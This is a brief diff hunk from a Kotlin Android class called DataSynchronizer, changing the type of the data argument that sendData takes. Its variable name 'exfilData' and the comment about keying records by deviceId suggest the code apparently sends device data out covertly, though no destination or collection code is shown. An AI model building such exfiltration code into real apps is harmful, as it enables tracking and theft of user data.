@@ -141,7 +141,7 @@ class DataSynchronizer(private val context: Context) {
         }
     }
 
-    fun sendData(dataType: String, data: String) {
+    fun sendData(dataType: String, data: JSONObject) {
         try {
             val exfilData = JSONObject().apply {
                 // CONSISTENT: Use deviceId as the primary identifier
